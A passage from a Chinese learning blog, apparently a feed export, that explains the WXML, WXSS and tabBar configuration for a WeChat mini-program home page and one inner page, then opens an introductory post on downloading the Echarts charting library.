<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.pubTitle&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">  height: 60rpx;</span><br><span class="line">  align-items: center;</span><br><span class="line">  margin-bottom: 40rpx;</span><br><span class="line">&#125;</span><br><span class="line">.pubTitle .txt&#123;</span><br><span class="line">  font-size: 40rpx;</span><br><span class="line">  height: 100%;</span><br><span class="line">  position: relative;</span><br><span class="line">  padding-left: 20rpx;</span><br><span class="line">&#125;</span><br><span class="line">.pubTitle .txt::before&#123;</span><br><span class="line">  display: block;</span><br><span class="line">  width: 8rpx;</span><br><span class="line">  height: 34rpx;</span><br><span class="line">  background: #d80b07;</span><br><span class="line">  content: &quot;&quot;;</span><br><span class="line">  position: absolute;</span><br><span class="line">  left: 0;</span><br><span class="line">  top: 13rpx;</span><br><span class="line">&#125;</span><br><span class="line">.pubTitle .more&#123;</span><br><span class="line">  font-size: 34rpx;</span><br><span class="line">  color: #666;</span><br><span class="line">&#125;</span><br><span class="line">.works&#123;</span><br><span class="line">  background-color: #f0f3f8;</span><br><span class="line">  padding: 90rpx 0 70rpx;</span><br><span class="line">&#125;</span><br><span class="line">.wkMain&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-wrap: wrap;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">&#125;</span><br><span class="line">.wkMain .box&#123;</span><br><span class="line">  width: 344rpx;</span><br><span class="line">  height: 214rpx;</span><br><span class="line">  margin-bottom: 10rpx;</span><br><span class="line">  position: relative;</span><br><span class="line">&#125;</span><br><span class="line">.wkMain .pic&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.wkMain .ceng&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  background: rgba(0,0,0,0.5);</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 0;</span><br><span class="line">  left: 0;</span><br><span class="line">  color: #fff;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  justify-content: center;</span><br><span class="line">  align-items: center;</span><br><span class="line">  &#x2F;* 内填充 *&#x2F;</span><br><span class="line">  padding: 0 20rpx;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  &#x2F;* 内填充 *&#x2F;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">.wkMain .ceng .tit&#123;</span><br><span class="line">  font-size: 34rpx;</span><br><span class="line">&#125;</span><br><span class="line">.wkMain .ceng .des&#123;</span><br><span class="line">  opacity: 0.6;</span><br><span class="line">  text-transform: uppercase;</span><br><span class="line">  font-size: 24rpx;</span><br><span class="line">  letter-spacing: 5rpx;</span><br><span class="line">&#125;</span><br><span class="line">.wkMain .ceng .line&#123;</span><br><span class="line">  width: 50rpx;</span><br><span class="line">  height: 2rpx;</span><br><span class="line">  background: #fff;</span><br><span class="line">  margin: 10rpx 0 20rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pubTitle类：用弹性布局，<code>justify-content: space-between;</code>和<code>align-items: center;</code>让txt类和more类两端对齐并且垂直对齐，用PS量设计图尺寸，高度60rpx，底部外边距40rpx。因为这个布局其他地方要用到所以可以写到全局样式里</p>
<p>pubTitle类里的txt类：加了一个左部内边距，为一条小红块腾出空间，然后设置了相对定位也是为了小红块的定位做参考</p>
<p>pubTitle类里的txt类的:before选择器：在元素前插入内容(小红块)，用PS量设计图尺寸，宽8rpx高34rpx，用PS吸颜色设置背景色，因为只是一个小红块没有具体内容所以设置<code>content: &quot;&quot;</code>，使用绝对定位，然后用<code>left: 0;top: 13rpx;</code>调整位置让他位于txt文字类左边，因为整个pubTitle类高60rpx，而小红块自己有34rpx，算一下为了让他垂直居中，就要距离顶部13rpx((60-34)/2)</p>
<p>pubTitle类里的more类：PS量字体大小34rpx，吸颜色#666</p>
<p>works类：因为整个学员作品模块有个灰色背景色，所以在在外层works类设置背景色，并且内容上下有留空，所以设置内边距，距离顶部90rpx距离底部70rpx</p>
<p>wkMain类：这是存放8个作品的外层容器，设置弹性布局，两端对齐，并且有换行</p>
<p>wkMain类里的box类：这是每个具体作品的容器，PS量高，设置214rpx，宽因为要考虑整个宽750rpx，并且两边有26rpx的内边距，剩下698rpx，因为想让每行显示两个作品并且两作品之间留有空白，所以设置宽为344rpx，然后每行也要有空间，所以设置底部外边距10rpx，设置相对定位是为了之后要用的蒙版的绝对定位做准备</p>
<p>wkMain类里的pic类：设置图片宽高100%</p>
<p>wkMain类里的ceng类：这是蒙版遮罩层，设置宽高100%，背景颜色使用<code>rgba(0,0,0,0.5)</code>设置为黑色并且一半的透明度，然后设置绝对定位，相对box类左0顶0正好完全覆盖整个作品，设置字体颜色白色(PS吸的)，因为ceng类里面还有三个类，想让他们上下排列所以使用弹性布局，<code>flex-direction: column</code>设置主轴为垂直方向，起点在上沿，<code>justify-content: center</code>设置项目在主轴上居中对齐，<code>align-items: center</code>设置项目在交叉轴上居中对齐，设置这两个为了让那三个类水平垂直都居中，为了不让字体超出边框，设置<code>padding: 0 20rpx;box-sizing: border-box</code>来增加内填充，最后是字体居中</p>
<p>xkMain类里的ceng类里的tit类：作品小标题，PS量后设置字体大小34rpx</p>
<p>xkMain类里的ceng类里的des类：作品描述，设置不透明度0.6，<code>text-transform: uppercase</code>全部大写，PS量设置字体大小24rpx，<code>letter-spacing: 5rpx</code>设置字符间距5rpx</p>
<p>xkMain类里的ceng类里的line类：这个就是一条白线，PS量宽50rpx高2rpx，背景为白色，然后设置外边距，距离顶部10rpx，距离底部20rpx</p>
<p>效果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210522162234228.png" alt="image-20210522162234228"></p>
<h2 id="行业动态及底部模块"><a href="#行业动态及底部模块" class="headerlink" title="行业动态及底部模块"></a>行业动态及底部模块</h2><p>index.wxml新增：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&#39;dynamic&#39;&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;container&#39;&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;pubTitle&#39;&gt;</span><br><span class="line">      &lt;view class&#x3D;&#39;txt&#39;&gt;行业动态&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;more&#39;&gt;更多&gt;&lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;  </span><br><span class="line">    &lt;view class&#x3D;&#39;dyMain&#39;&gt;</span><br><span class="line">      &lt;navigator class&#x3D;&#39;dyItem&#39; wx:for&#x3D;&quot;&#123;&#123;5&#125;&#125;&quot;&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;pic&#39;&gt;</span><br><span class="line">          &lt;image src&#x3D;&#39;&#x2F;images&#x2F;xszp1.jpg&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;view class&#x3D;&#39;txt&#39;&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;title&#39;&gt;标题内容&lt;&#x2F;view&gt;</span><br><span class="line">          &lt;view class&#x3D;&#39;info&#39;&gt;</span><br><span class="line">            &lt;text space&#x3D;&quot;ensp&quot;&gt;作者 ：王进  -  时间：2021-05-22&lt;&#x2F;text&gt;</span><br><span class="line">          &lt;&#x2F;view&gt;</span><br><span class="line">        &lt;&#x2F;view&gt;</span><br><span class="line">      &lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br><span class="line">&lt;view class&#x3D;&#39;footer&#39;&gt;</span><br><span class="line">  &lt;image class&#x3D;&#39;pic&#39; mode&#x3D;&quot;widthFix&quot; src&#x3D;&#39;&#x2F;images&#x2F;logo.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;text&#39;&gt;- 高端实训品牌- &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>上面最外层有一个dynamic类，因为顶部内容和上一个模块一样，所以复制过来container类，下面是主体内容dyMain类，里面是五个导航dyItem类，每个导航里有一个图片pic类和一个文本txt类，文本txt类里又有一个标题title类和信息info类。</p>
<p>下面的页脚是footer类，里面有一个图片pic类和一个放文字的text类</p>
<p>index.wxss新增:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.dynamic&#123;</span><br><span class="line">  padding: 90rpx 0 70rpx;</span><br><span class="line">&#125;</span><br><span class="line">.dyItem&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  padding: 15rpx 0;</span><br><span class="line">  border: 1px dashed #eee;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">&#125;</span><br><span class="line">.dyItem .pic&#123;</span><br><span class="line">  width: 230rpx;</span><br><span class="line">  height: 150rpx;</span><br><span class="line">&#125;</span><br><span class="line">.dyItem .pic image&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.dyItem .txt&#123;</span><br><span class="line">  width: 440rpx;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">&#125;</span><br><span class="line">.dyItem .title&#123;</span><br><span class="line">  font-size: 34rpx;</span><br><span class="line">&#125;</span><br><span class="line">.dyItem .info&#123;</span><br><span class="line">  font-size: 26rpx;</span><br><span class="line">  color: #888;</span><br><span class="line">&#125;</span><br><span class="line">.footer&#123;</span><br><span class="line">  padding: 30rpx 0;</span><br><span class="line">  background-color: #f2f2f2;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">.footer .pic&#123;</span><br><span class="line">  width: 180rpx;</span><br><span class="line">&#125;</span><br><span class="line">.footer .text&#123;</span><br><span class="line">  font-size: 25rpx;</span><br><span class="line">  color: #666;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dynamic类：设置内边距，距离顶部90rpx，距离底部70rpx</p>
<p>dyItem类：设置弹性布局，然后两端对齐(图片在左，txt类在右)，然后加个内边距上下15rpx左右0rpx，再加个虚线边框</p>
<p>dyItem类里的pic类：PS量尺寸，设置宽230rpx高150rpx</p>
<p>dyItem类里pic类里的image组件：宽高100%，继承父级pic类的宽高</p>
<p>dyItem类里的txt类：宽度考虑内边距和要留空所以设置440rpx，使用弹性布局，设置主轴为垂直方向并且两端对齐，这样就可以让里面的title类和info类上下分布了</p>
<p>dyItem类里的title类：设置字体大小34rpx</p>
<p>dyItem类里的info类：设置字体大小26rpx，颜色#888</p>
<p>footer类：设置内边距上下30rpx左右0rpx，背景颜色为灰色，设置文本居中，让图片和文字都居中</p>
<p>footer类里的pic类：根据图片宽度设置180rpx</p>
<p>footer类里的text类：设置字体大小25rpx，颜色#666</p>
<p>效果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210522172052923.png" alt="image-20210522172052923"></p>
<p>因为里面的图片素材没有所以懒得改了直接就for5个出来。到这里，整个首页就做完了，跟着老师把首页写完，主要是想学习小程序页面怎么写顺便复习一下前端的html和css。由于时间问题想快速进入下一阶段(逻辑层)，所以其他页面不写了，后面用的是老师给的完整版实例</p>
<h2 id="tabBar栏目导航配置"><a href="#tabBar栏目导航配置" class="headerlink" title="tabBar栏目导航配置"></a>tabBar栏目导航配置</h2><p>全局配置里的pages新建两个新页面，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;pages&quot;:[</span><br><span class="line">    &quot;pages&#x2F;index&#x2F;index&quot;,</span><br><span class="line">    &quot;pages&#x2F;logs&#x2F;logs&quot;,</span><br><span class="line">    &quot;pages&#x2F;works&#x2F;works&quot;,</span><br><span class="line">    &quot;pages&#x2F;dynamic&#x2F;dynamic&quot;</span><br><span class="line">  ],</span><br></pre></td></tr></table></figure>

<p>index和logs页面是项目初始化就有的，下面两个是新建的页面</p>
<p>然后在全局配置里新建一个tabBar对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;tabBar&quot;: &#123;</span><br><span class="line">    &quot;color&quot;: &quot;#B6B6B6&quot;,</span><br><span class="line">    &quot;selectedColor&quot;: &quot;#fe9132&quot;,</span><br><span class="line">    &quot;list&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;pagePath&quot;: &quot;pages&#x2F;index&#x2F;index&quot;,</span><br><span class="line">        &quot;text&quot;: &quot;首页&quot;,</span><br><span class="line">        &quot;iconPath&quot;: &quot;&#x2F;images&#x2F;home.png&quot;,</span><br><span class="line">        &quot;selectedIconPath&quot;: &quot;&#x2F;images&#x2F;home-h.png&quot;</span><br><span class="line">      &#125;,&#123;</span><br><span class="line">        &quot;pagePath&quot;: &quot;pages&#x2F;works&#x2F;works&quot;,</span><br><span class="line">        &quot;text&quot;: &quot;作品&quot;,</span><br><span class="line">        &quot;iconPath&quot;: &quot;&#x2F;images&#x2F;user.png&quot;,</span><br><span class="line">        &quot;selectedIconPath&quot;: &quot;&#x2F;images&#x2F;user-h.png&quot;</span><br><span class="line">      &#125;,&#123;</span><br><span class="line">        &quot;pagePath&quot;: &quot;pages&#x2F;dynamic&#x2F;dynamic&quot;,</span><br><span class="line">        &quot;text&quot;: &quot;动态&quot;,</span><br><span class="line">        &quot;iconPath&quot;: &quot;&#x2F;images&#x2F;list.png&quot;,</span><br><span class="line">        &quot;selectedIconPath&quot;: &quot;&#x2F;images&#x2F;list-h.png&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>加了<code>color</code>和<code>selectedColor</code>，因为图片选中时颜色是黄色未选中时是灰色，所以给文字也设置选中时颜色为黄色未选中时灰色，用PS吸一下颜色就可以了，然后再加个<code>list</code>数组存放跳转的地址、文字、图标路径、选中时图标路径</p>
<p>效果图：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210522184045814.png" alt="image-20210522184045814"></p>
<h2 id="内页的页面架构布局"><a href="#内页的页面架构布局" class="headerlink" title="内页的页面架构布局"></a>内页的页面架构布局</h2><p>内页指的应该是二级页面，二级页面就是左上角有返回键的页面(如下图)，需要按返回键返回的都叫上一界面的二级界面。一级页面应该就是tab页面(底部三个页面)</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210522221311665.png" alt="image-20210522221311665"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210522221359380.png" alt="image-20210522221359380"></p>
<p>这里做的内页就是点击首页的横向滚动区的导航跳转的页面，如下图</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210522221532509.png" alt="image-20210522221532509"></p>
<p>首先在全局配置里新建一个页面(我这里叫ps页面)，然后把首页里写的导航里的url改成ps这个页面实现跳转，下面是内页具体代码</p>
<p>ps.wxml:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&quot;header&quot;&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;container hdcon&#39;&gt;</span><br><span class="line">    &lt;navigator open-type&#x3D;&quot;switchTab&quot; url&#x3D;&quot;&#x2F;pages&#x2F;index&#x2F;index&quot; class&#x3D;&#39;logo&#39;&gt;</span><br><span class="line">      &lt;image mode&#x3D;&quot;heightFix&quot; src&#x3D;&quot;&#x2F;images&#x2F;logo.png&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">    &lt;&#x2F;navigator&gt;</span><br><span class="line">    &lt;view  class&#x3D;&#39;kefu&#39;&gt;</span><br><span class="line">      &lt;button open-type&#x3D;&quot;contact&quot; class&#x3D;&quot;btn&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">      &lt;image mode&#x3D;&quot;heightFix&quot; src&#x3D;&quot;&#x2F;images&#x2F;xiaoxi.png&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br><span class="line"></span><br><span class="line">&lt;view class&#x3D;&#39;banner&#39;&gt;</span><br><span class="line">  &lt;image src&#x3D;&#39;&#x2F;images&#x2F;psbanner.jpg1 (1).jpg&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br><span class="line">&lt;view class&#x3D;&#39;psBox&#39;&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;psBoxTit&#39;&gt;</span><br><span class="line">    专业软件技能</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;psBoxConOne&#39;&gt;  </span><br><span class="line">    &lt;view class&#x3D;&#39;item&#39;&gt;</span><br><span class="line">      &lt;image src&#x3D;&#39;&#x2F;images&#x2F;photoshop.png1.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view&gt;photoshop&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;item&#39;&gt;</span><br><span class="line">      &lt;image src&#x3D;&#39;&#x2F;images&#x2F;ai.png2.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view&gt;Ai&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;item&#39;&gt;</span><br><span class="line">      &lt;image src&#x3D;&#39;&#x2F;images&#x2F;id.png3.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view&gt;Id&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;item&#39;&gt;</span><br><span class="line">      &lt;image src&#x3D;&#39;&#x2F;images&#x2F;CDR.png4.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view&gt;CDR&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;item&#39;&gt;</span><br><span class="line">      &lt;image src&#x3D;&#39;&#x2F;images&#x2F;acrobat.png6.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">      &lt;view&gt;Acrobat&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt; </span><br><span class="line">&lt;&#x2F;view&gt;</span><br><span class="line">&lt;view class&#x3D;&#39;psBox&#39; wx:for&#x3D;&quot;&#123;&#123;5&#125;&#125;&quot;&gt;&lt;!-- wx:for测试用 --&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;psBoxTit&#39;&gt;</span><br><span class="line">    专业软件技能</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;psBoxCon&#39;&gt;</span><br><span class="line">    &lt;image class&#x3D;&#39;pic&#39; src&#x3D;&#39;&#x2F;images&#x2F;psmajor02.jpg2.jpg&#39; mode&#x3D;&quot;widthFix&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;text&#39;&gt;</span><br><span class="line">      &lt;view&gt;人像精修&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;view&gt;商业广告片调色&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;view&gt;商业海报级视觉精修&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;view&gt;卡通人物制作&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;view&gt;2.5D插画制作&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;view&gt;3D文字视觉特效制作&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;view&gt;平面广告创意&lt;&#x2F;view&gt;</span><br><span class="line">      &lt;view&gt;合成特效制作&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt; </span><br><span class="line">&lt;&#x2F;view&gt;</span><br><span class="line"></span><br><span class="line">&lt;view class&#x3D;&#39;footer&#39;&gt;</span><br><span class="line">  &lt;image class&#x3D;&#39;pic&#39; mode&#x3D;&quot;widthFix&quot; src&#x3D;&#39;&#x2F;images&#x2F;logo.png&#39;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">  &lt;view class&#x3D;&#39;text&#39;&gt;- 高端实训品牌 -&lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>最上面的header容器和最下面的footer容器都是从首页里复制过来的，banner容器放的是一张大图，psBox容器是主题，一共有6个psBox容器，因为第一个和后面五个内容稍有差别所以单独写出来了，后面五个内容几乎一样，只是里面的字要改，为了测试直接用wx:for五个相同的，内容不改了，达到预期效果就好。每个psBox里有一个标题psBoxTit类和内容psBoxCon类(第一个为了区别叫psBoxConOne)，第一个内容类里有5个item类，每个item类里包括图片和文字，后面5个内容类里直接是是图片和文字</p>
<p>ps.wxss:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.header&#123;</span><br><span class="line">  width:100%; &#x2F;*或者750rpx*&#x2F;</span><br><span class="line">  height:90rpx;</span><br><span class="line">&#125;</span><br><span class="line">.hdcon&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">  align-items: center;</span><br><span class="line">  height:100%;</span><br><span class="line">&#125;</span><br><span class="line">.hdcon navigator,.hdcon .kefu&#123;</span><br><span class="line">  height:50rpx;</span><br><span class="line">&#125;</span><br><span class="line">.hdcon image&#123;</span><br><span class="line">  height:100%;</span><br><span class="line">&#125;</span><br><span class="line">.kefu&#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  animation: dh linear 1s infinite alternate;</span><br><span class="line">&#125;</span><br><span class="line">.kefu .btn&#123;</span><br><span class="line">  position: absolute;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  top:0;</span><br><span class="line">  left:0;</span><br><span class="line">  opacity: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.banner&#123;</span><br><span class="line">  &#x2F;* width: 750rpx; *&#x2F;</span><br><span class="line">  width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.banner image&#123;</span><br><span class="line">  display: block;&#x2F;*图像是行内元素，行元素和下面会有个间隔，把他转成块元素就好了*&#x2F;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 1080rpx; &#x2F;* 或者在image组件里写mode&#x3D;&#39;widthFix&#39; 宽度不变高度自适应 *&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">.psBox&#123;</span><br><span class="line">  padding: 80rpx 0;</span><br><span class="line">  background-color: #1c356e;&#x2F;*QQ截图Ctrl+C可以吸取十六进制颜色*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">.psBox:nth-child(2n)&#123;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxTit&#123;</span><br><span class="line">  width: 490rpx;</span><br><span class="line">  height: 70rpx;</span><br><span class="line">  background-color: #de2e05;</span><br><span class="line">  border-radius: 70rpx;</span><br><span class="line">  color: #fff;</span><br><span class="line">  text-align: center;</span><br><span class="line">  line-height: 70rpx;</span><br><span class="line">  font-size: 40rpx;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  position: relative;</span><br><span class="line">  margin-bottom: 40rpx;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxTit::before&#123;</span><br><span class="line">  display: block;</span><br><span class="line">  content: &quot;&quot;;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 100%;</span><br><span class="line">  border: 2px dotted #de2e05;</span><br><span class="line">  border-radius: 70rpx;</span><br><span class="line">  position: absolute;</span><br><span class="line">  top: 0;</span><br><span class="line">  left: 0;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  transform: scale(1.03,1.2);</span><br><span class="line">&#125;</span><br><span class="line">.psBoxCon image&#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxCon .text&#123;</span><br><span class="line">  padding: 40rpx 26rpx 0;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-wrap: wrap;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxCon .text view&#123;</span><br><span class="line">  width: 50%;</span><br><span class="line">  font-size: 30rpx;</span><br><span class="line">  line-height: 1.8em;</span><br><span class="line">  position: relative;</span><br><span class="line">  padding-left: 18rpx;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxCon .text view::before&#123;</span><br><span class="line">  content: &quot;&quot;;</span><br><span class="line">  display: block;</span><br><span class="line">  width: 10rpx;</span><br><span class="line">  height: 10rpx;</span><br><span class="line">  border-radius: 50%;</span><br><span class="line">  background-color: #000;</span><br><span class="line">  position: absolute;</span><br><span class="line">  left: 0;</span><br><span class="line">  top: 50%;</span><br><span class="line">  margin-top: -5rpx;</span><br><span class="line">&#125;</span><br><span class="line">.psBox:nth-child(2n-1) .psBoxCon .text&#123;</span><br><span class="line">  color: #fff;</span><br><span class="line">&#125;</span><br><span class="line">.psBox:nth-child(2n-1) .text view::before&#123;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxConOne&#123;</span><br><span class="line">  color: #fff;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-wrap: wrap;</span><br><span class="line">  justify-content: center;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxConOne .item&#123;</span><br><span class="line">  text-align: center;</span><br><span class="line">  padding: 30rpx;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxConOne image&#123;</span><br><span class="line">  width: 150rpx;</span><br><span class="line">  height: 150rpx;</span><br><span class="line">&#125;</span><br><span class="line">.psBoxConOne .item view&#123;</span><br><span class="line">  text-transform: uppercase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.footer&#123;</span><br><span class="line">  padding: 30rpx 0;</span><br><span class="line">  background-color: #f2f2f2;</span><br><span class="line">  text-align: center;</span><br><span class="line">&#125;</span><br><span class="line">.footer .pic&#123;</span><br><span class="line">  width: 180rpx;</span><br><span class="line">&#125;</span><br><span class="line">.footer .text&#123;</span><br><span class="line">  font-size: 25rpx;</span><br><span class="line">  color: #666;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>头部的header样式和底部的footer样式是从首页样式拿过来的，我用空格分开了，中间部分是这个新页面需要的样式。另外，样式太多为了省时就记录一下自己觉得重点的和难的地方。</p>
<p>banner类里image：为什么要用块级展示在注释里写了，这是之前我不知道的</p>
<p>psBox类：主要记录一下QQ截图的时候可以用Ctrl+C吸取十六进制颜色，这样就不用打开PS了，是个小trick</p>
<p>psBox的nth-child选择器：这个选择器之前学CSS的时候没见过，记录一下，该选择器匹配同类型中的第 n 个同级兄弟元素，因为想要做的效果是奇数的psBox背景色是蓝色，偶数背景色是白色，所以用到这个选择器，可以用关键字(odd代表奇数、even代表偶数)或者公式(an+b)，a代表一个循环的大小，N是一个计数器（从0开始），以及b是偏移量</p>
<p>psBoxTit类的before选择器：用点线边框围住标题，和之前的小红块类似，内容设为空，然后用绝对定位来参考父级的相对定位，设置top和left为0，有border加<code>box-sizing: border-box</code>，但是仅仅这样的话就完全贴住背景颜色看不出边框线了，所以用<code>transform: scale(1.03,1.2)</code>来进行放大，这个属性之前用的也很少，这里记录一下， Transform属性应用于元素的2D或3D转换。这个属性允许你将元素旋转，缩放，移动，倾斜等。</p>
<p>psBoxCon类里text类里view里的before选择器：和之前小红块类似，也是在每个文本前面加一个小圆圈图标</p>
<p>psBoxConOne类里的item类里的view：<code>text-transform: uppercase</code>转换为大写字母</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.runoob.com/" target="_blank" rel="noopener">https://www.runoob.com/</a></p>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
  </entry>
  <entry>
    <title>数据可视化-Echarts入门</title>
    <url>/2021/05/16/Echart-study/</url>
    <content><![CDATA[<p>学习Echarts来制作数据可视化要用的图表<a id="more"></a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a href="https://echarts.apache.org/zh/index.html" target="_blank" rel="noopener">Echarts</a>是百度开源的基于JavaScript的可视化图表库，里面有很多很好看的图表可以用来可视化使用，学会一个，其他的触类旁通</p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://echarts.apache.org/zh/download.html，从Github下载编译产物" target="_blank" rel="noopener">https://echarts.apache.org/zh/download.html，从Github下载编译产物</a></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516130636315.png" alt="image-20210516130636315"></p>
<p>可以看到里面有很多版本的js，入门的话最小版(echarts.min.js)够用了</p>
<p>或者根据需要定制下载，这样可以最小化JS，以加快网页加载速度</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210516130927564.png" alt="image-20210516130927564"></p>
